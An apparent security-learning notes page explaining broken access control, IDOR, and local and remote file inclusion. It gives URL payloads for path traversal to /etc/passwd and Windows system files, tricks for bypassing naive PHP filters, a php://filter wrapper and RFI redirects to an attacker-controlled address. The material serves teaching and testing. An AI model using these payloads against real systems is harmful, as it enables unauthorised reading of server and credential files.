---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Broken Access Control

Users can act outside of their intended permissions,  typically leading to unauthorized information disclosure, modification, or destruction of data. The most common ways in which it's presented are:

* **IDOR:** Insecure Direct Object Reference, when an application fails to secure access to restringed data to a user.
* **Weak authorization:** Fail to protect sensitive content. For example, secure the admin page with a readable cookie.
* **Security through obscurity:** Try to hide secret information in paths that seem not to be visible.
* **File Inclusion:** Setting routes via URL to access system files or redirecting to other pages.

We can find a typical example of this vulnerability as follows:

* URL contains an enumeration of internal objects.

{% code overflow="wrap" lineNumbers="true" %}
```bash
#It is searching for an object with id=2
http://$url/id/2
#We can assume that existing id=1 or any number and try to get it
http://$url/id/$number #This could show objects normally hidden from the user
```
{% endcode %}

## <mark style="color:purple;">Local File Inclusion</mark>

Also known as LFI, when an attacker can get a website to include a file that was not intended to be an option for this application.

Following we find a typical process for leveraging this vulnerability:

* Check if parameters in the URL receive the name of a file

{% code overflow="wrap" lineNumbers="true" %}
```bash
#It's searching for a file
http://$url/$query?$param=hola.php
#We can try to access the system files
http://$url/$query?$param=/etc/passwd
```
{% endcode %}

***

* When this doesn't work directly, we can try to get to the root folder

{% tabs %}
{% tab title="On Linux server" %}
{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../etc/passwd
```
{% endcode %}
{% endtab %}

{% tab title="On Windows server" %}
{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../../WINDOWS/system32/drivers/etc/hosts
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="info" %}
It is useful to put as many `../` as possible to get to the root folder
{% endhint %}

***

* In some cases, we can check the page code to see the conditions of the input.

{% tabs %}
{% tab title="Case 1" %}
The code is searching for a file whose name starts with _file_

{% code title="Example source code" %}
```php
...
$file = str_replace( array( "../", "..\\" ), "", $file );
...
```
{% endcode %}

We can use the `\` to bypass this verification

```bash
http://$url/$query?$param=..\/..\/..\/..\/etc/passwd
```

Also if we use `..././` the code will do the replacement and leave us anyway with `../`, and we will also bypass this verification

```bash
http://$url/$query?$param=..././..././..././..././etc/passwd
```
{% endtab %}

{% tab title="Case 2" %}
The code is searching for a file whose name starts with _file_

{% code title="Example source code" overflow="wrap" lineNumbers="true" %}
```php
...
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
...
```
{% endcode %}

We can set our input to start with _file_ to bypass this verification

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/$query?$param=file/../../../../etc/passwd
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:purple;">Remote File Inclusion</mark>

Also known as RFI, an attacker can redirect actions to or from another server.

Following we find a typical process for leveraging this vulnerability:

* Redirect actions of a server via URL parameters

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">#It's searching for a file
http://$url/$query?$param=hola.php
<strong>#We can do a redirection to another site
</strong>http://$url/$query?$param=http://$url
#Or a redirection to a local server
http://$url/$query?$param=//$myip
</code></pre>

***

* In some cases, we can check the page code to see the conditions of the input.

{% tabs %}
{% tab title="Case 1" %}
We find that the code is blocking the connection through the HTTP protocol

{% code title="Example source code" overflow="wrap" lineNumbers="true" %}
```php
...
$file = str_replace( array( "http://", "https://" ), "", $file );
...

```
{% endcode %}

In this case, we can try to use another connection protocol

```bash
http://$url/$query?$param=php://filter/resource=/etc/passwd
```

Also if we use `hthttp://tp://` the code will do the replacement and leave us anyway with `http://`, and we will also bypass this verification

```bash
http://$url/$query?$param=hthttp://tp://$url
```
{% endtab %}
{% endtabs %}
